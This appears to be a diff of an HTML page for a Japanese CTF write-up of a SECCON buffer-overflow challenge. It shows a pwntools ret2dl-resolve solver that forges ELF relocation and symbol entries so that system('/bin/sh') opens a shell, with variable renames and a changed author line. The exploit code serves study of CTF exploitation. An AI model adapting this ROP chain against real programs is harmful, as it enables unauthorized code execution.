@@ -626,37 +626,37 @@ ROPチェインの作成
 <div class="src src-python">
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span> <span style="color:#75715e"># padding</span>
 </span></span><span style="display:flex;"><span> buf <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x84</span>                 <span style="color:#75715e"># fill stack</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeaf</span>)         <span style="color:#75715e"># saved_ebp</span>
+</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeaf</span>)          <span style="color:#75715e"># saved_ebp</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span> <span style="color:#75715e"># gets(fake_elf32_rel_addr)</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(gets_plt)           <span style="color:#75715e"># main return addr</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(pop_ret)            <span style="color:#75715e"># gets return addr</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(fake_elf32_rel_addr)     <span style="color:#75715e"># gets arg</span>
+</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(gets_plt)            <span style="color:#75715e"># main return addr</span>
+</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(pop_ret)             <span style="color:#75715e"># gets return addr</span>
+</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(fake_elf32_rel_addr) <span style="color:#75715e"># gets arg</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span> <span style="color:#75715e"># gets(fake_elf32_sym_addr)</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(gets_plt)           <span style="color:#75715e"># pop ret return addr</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(pop_ret)            <span style="color:#75715e"># gets return addr</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(fake_elf32_sym_addr)     <span style="color:#75715e"># gets arg</span>
+</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(gets_plt)            <span style="color:#75715e"># pop ret return addr</span>
+</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(pop_ret)             <span style="color:#75715e"># gets return addr</span>
+</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(fake_elf32_sym_addr) <span style="color:#75715e"># gets arg</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span> <span style="color:#75715e"># gets(system_symbol_addr)</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(gets_plt)           <span style="color:#75715e"># pop ret return addr</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(pop_ret)            <span style="color:#75715e"># gets return addr</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(system_symbol_addr) <span style="color:#75715e"># gets arg</span>
+</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(gets_plt)            <span style="color:#75715e"># pop ret return addr</span>
+</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(pop_ret)             <span style="color:#75715e"># gets return addr</span>
+</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(system_symbol_addr)  <span style="color:#75715e"># gets arg</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span> <span style="color:#75715e"># gets(sh_string_addr)</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(gets_plt)           <span style="color:#75715e"># pop ret return addr</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(pop_ret)            <span style="color:#75715e"># gets return  addr</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(sh_string_addr)     <span style="color:#75715e"># gets arg</span></span></span></code></pre></div>
+</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(gets_plt)            <span style="color:#75715e"># pop ret return addr</span>
+</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(pop_ret)             <span style="color:#75715e"># gets return addr</span>
+</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(sh_string_addr)      <span style="color:#75715e"># gets arg</span></span></span></code></pre></div>
 </div>
 <p>
      それぞれの構造体とシンボルの書き込みを行うROPを組んだ後、偽の構造体を元にアドレスを解決させるため、 <code>.plt</code> セクションの先頭にジャンプする。
      このとき、 <code>system</code> の引数として <code>&#34;/bin/sh&#34;</code> を取れるように、 <code>&#34;/bin/sh&#34;</code> が格納されたアドレスをスタックに積んでおく。</p>
 <div class="src src-python">
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span> <span style="color:#75715e"># system(&#39;/bin/sh&#39;)</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(plt)                <span style="color:#75715e"># pop ret return addr</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(reloc_arg)          <span style="color:#75715e"># reloc arg</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>)         <span style="color:#75715e"># return address of system()</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(sh_string_addr)     <span style="color:#75715e"># system arg</span></span></span></code></pre></div>
+</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(plt)                 <span style="color:#75715e"># pop ret return addr</span>
+</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(reloc_arg)           <span style="color:#75715e"># reloc arg</span>
+</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>)          <span style="color:#75715e"># system return addr</span>
+</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(sh_string_addr)      <span style="color:#75715e"># system arg</span></span></span></code></pre></div>
 </div>
 </div>
 </div>
@@ -674,8 +674,8 @@ Solver
 </span></span><span style="display:flex;"><span>chall <span style="color:#f92672">=</span> ELF(filename)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># docker-compose up</span>
-</span></span><span style="display:flex;"><span>conn <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;localhost&#39;</span>, <span style="color:#ae81ff">9001</span>)
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># conn = process(filename)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># conn = remote(&#39;localhost&#39;, 9001)</span>
+</span></span><span style="display:flex;"><span>conn <span style="color:#f92672">=</span> process(filename)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>plt <span style="color:#f92672">=</span> chall<span style="color:#f92672">.</span>get_section_by_name(<span style="color:#e6db74">&#39;.plt&#39;</span>)<span style="color:#f92672">.</span>header<span style="color:#f92672">.</span>sh_addr
 </span></span><span style="display:flex;"><span>bss <span style="color:#f92672">=</span> chall<span style="color:#f92672">.</span>get_section_by_name(<span style="color:#e6db74">&#39;.bss&#39;</span>)<span style="color:#f92672">.</span>header<span style="color:#f92672">.</span>sh_addr
@@ -688,57 +688,57 @@ Solver
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># 0x08049022: pop ebx; ret;</span>
 </span></span><span style="display:flex;"><span>pop_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08049022</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Elf32_Rel_addr <span style="color:#f92672">=</span> bss
+</span></span><span style="display:flex;"><span>fake_elf32_rel_addr <span style="color:#f92672">=</span> bss
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Elf32_Sym_addr <span style="color:#f92672">=</span> Elf32_Rel_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>
+</span></span><span style="display:flex;"><span>fake_elf32_sym_addr <span style="color:#f92672">=</span> fake_elf32_rel_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>system_symbol_addr <span style="color:#f92672">=</span> Elf32_Sym_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x14</span>
+</span></span><span style="display:flex;"><span>system_symbol_addr <span style="color:#f92672">=</span> fake_elf32_sym_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x14</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>sh_symbol_addr <span style="color:#f92672">=</span> system_symbol_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1c</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># calc index of Elf32_Rel from .rel.plt</span>
-</span></span><span style="display:flex;"><span>reloc_arg <span style="color:#f92672">=</span> Elf32_Rel_addr <span style="color:#f92672">-</span> rel
+</span></span><span style="display:flex;"><span>reloc_arg <span style="color:#f92672">=</span> fake_elf32_rel_addr <span style="color:#f92672">-</span> rel
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># padding</span>
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x84</span>                 <span style="color:#75715e"># fill stack</span>
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeaf</span>)         <span style="color:#75715e"># saved_ebp</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x84</span>                  <span style="color:#75715e"># fill stack</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeaf</span>)           <span style="color:#75715e"># saved_ebp</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># gets(Elf32_Rel_addr)</span>
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(gets_plt)           <span style="color:#75715e"># main return addr</span>
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(pop_ret)            <span style="color:#75715e"># gets return addr</span>
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(Elf32_Rel_addr)     <span style="color:#75715e"># gets arg</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># gets(fake_elf32_rel_addr)</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(gets_plt)             <span style="color:#75715e"># main return addr</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(pop_ret)              <span style="color:#75715e"># gets return addr</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(fake_elf32_rel_addr)  <span style="color:#75715e"># gets arg</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># gets(Elf32_Sym_addr)</span>
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(gets_plt)           <span style="color:#75715e"># pop ret return addr</span>
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(pop_ret)            <span style="color:#75715e"># gets return addr</span>
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(Elf32_Sym_addr)     <span style="color:#75715e"># gets arg</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># gets(fake_elf32_sym_addr)</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(gets_plt)             <span style="color:#75715e"># pop ret return addr</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(pop_ret)              <span style="color:#75715e"># gets return addr</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(fake_elf32_sym_addr)  <span style="color:#75715e"># gets arg</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># gets(system_symbol_addr)</span>
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(gets_plt)           <span style="color:#75715e"># pop ret return addr</span>
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(pop_ret)            <span style="color:#75715e"># gets return addr</span>
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(system_symbol_addr) <span style="color:#75715e"># gets arg</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(gets_plt)             <span style="color:#75715e"># pop ret return addr</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(pop_ret)              <span style="color:#75715e"># gets return addr</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(system_symbol_addr)   <span style="color:#75715e"># gets arg</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># gets(sh_symbol_addr)</span>
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(gets_plt)           <span style="color:#75715e"># pop ret return addr</span>
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(pop_ret)            <span style="color:#75715e"># gets return  addr</span>
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(sh_symbol_addr)     <span style="color:#75715e"># gets arg</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(gets_plt)             <span style="color:#75715e"># pop ret return addr</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(pop_ret)              <span style="color:#75715e"># gets return addr</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(sh_symbol_addr)       <span style="color:#75715e"># gets arg</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># system(&#39;/bin/sh&#39;)</span>
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(plt)                <span style="color:#75715e"># pop ret return addr</span>
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(reloc_arg)          <span style="color:#75715e"># reloc arg</span>
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>)         <span style="color:#75715e"># padding</span>
-</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(sh_symbol_addr)     <span style="color:#75715e"># system arg</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(plt)                  <span style="color:#75715e"># pop ret return addr</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(reloc_arg)            <span style="color:#75715e"># reloc arg</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>)           <span style="color:#75715e"># system retrun addr</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> p32(sh_symbol_addr)       <span style="color:#75715e"># system arg</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>sendline(buf)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># create Elf32_Rel</span>
 </span></span><span style="display:flex;"><span>r_offset <span style="color:#f92672">=</span> gets_got
-</span></span><span style="display:flex;"><span>r_info   <span style="color:#f92672">=</span> ((Elf32_Sym_addr <span style="color:#f92672">-</span> dynsym)<span style="color:#f92672">//</span><span style="color:#ae81ff">0x10</span>)<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>r_info   <span style="color:#f92672">=</span> ((fake_elf32_sym_addr <span style="color:#f92672">-</span> dynsym)<span style="color:#f92672">//</span><span style="color:#ae81ff">0x10</span>)<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">7</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Elf32_Rel <span style="color:#f92672">=</span> p32(r_offset)
-</span></span><span style="display:flex;"><span>Elf32_Rel <span style="color:#f92672">+=</span> p32(r_info)
+</span></span><span style="display:flex;"><span>fake_elf32_rel <span style="color:#f92672">=</span> p32(r_offset)
+</span></span><span style="display:flex;"><span>fake_elf32_rel <span style="color:#f92672">+=</span> p32(r_info)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>sendline(Elf32_Rel)
+</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>sendline(fake_elf32_rel)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># create Elf32_Sym</span>
 </span></span><span style="display:flex;"><span>st_name <span style="color:#f92672">=</span> system_symbol_addr <span style="color:#f92672">-</span> dynstr
@@ -748,14 +748,14 @@ Solver
 </span></span><span style="display:flex;"><span>st_other <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
 </span></span><span style="display:flex;"><span>st_shndx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Elf32_Sym <span style="color:#f92672">=</span> p32(st_name)
-</span></span><span style="display:flex;"><span>Elf32_Sym <span style="color:#f92672">+=</span> p32(st_value)
-</span></span><span style="display:flex;"><span>Elf32_Sym <span style="color:#f92672">+=</span> p32(st_size)
-</span></span><span style="display:flex;"><span>Elf32_Sym <span style="color:#f92672">+=</span> p8(st_info)
-</span></span><span style="display:flex;"><span>Elf32_Sym <span style="color:#f92672">+=</span> p8(st_other)
-</span></span><span style="display:flex;"><span>Elf32_Sym <span style="color:#f92672">+=</span> p16(st_shndx)
+</span></span><span style="display:flex;"><span>fake_elf32_sym <span style="color:#f92672">=</span> p32(st_name)
+</span></span><span style="display:flex;"><span>fake_elf32_sym <span style="color:#f92672">+=</span> p32(st_value)
+</span></span><span style="display:flex;"><span>fake_elf32_sym <span style="color:#f92672">+=</span> p32(st_size)
+</span></span><span style="display:flex;"><span>fake_elf32_sym <span style="color:#f92672">+=</span> p8(st_info)
+</span></span><span style="display:flex;"><span>fake_elf32_sym <span style="color:#f92672">+=</span> p8(st_other)
+</span></span><span style="display:flex;"><span>fake_elf32_sym <span style="color:#f92672">+=</span> p16(st_shndx)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>sendline(Elf32_Sym)
+</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>sendline(fake_elf32_sym)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># create system symbol</span>
 </span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;system&#39;</span>)
@@ -864,7 +864,7 @@ SECCON{jUst_4_s1mpL3_b0f_ch4ll3ng3}
 </ul>
 <p>
 created 2022/11/11<br>
-updated 2022/12/21</p>
+updated 2023/2/28</p>
 </div>
 </div>
 
@@ -891,7 +891,7 @@ updated 2022/12/21</p>
     
     
         <p>
-            By mc4nf, 
+            By siva, 
             2023-02-28
         </p>
     
